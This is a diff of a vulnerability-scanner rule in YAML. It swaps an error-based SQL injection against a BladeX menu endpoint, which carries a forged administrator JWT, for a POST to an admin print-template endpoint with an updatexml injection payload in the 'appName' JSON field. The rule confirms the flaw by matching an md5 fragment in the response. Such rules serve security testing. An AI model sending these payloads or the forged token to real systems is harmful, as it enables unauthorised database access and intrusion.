@@ -7,11 +7,12 @@ rules:
   r0:
     request:
       cache: true
-      method: GET
-      path: /api/blade-system/menu/menu-list?updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1)=1
+      method: POST
+      path: /admin/configApp/queryPrintTemplate
       headers:
-        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
-      follow_redirects: true
+        Content-Type: application/json;charset=UTF-8
+      body: |-
+        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"1' and updatexml(1,concat(0x7e,(select md5({{s1}})),0x7e),1) AND '123'='123","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
     expression: response.body_string.contains(substr(md5(string(s1)), 2, 28))
 expression: r0()
 detail:
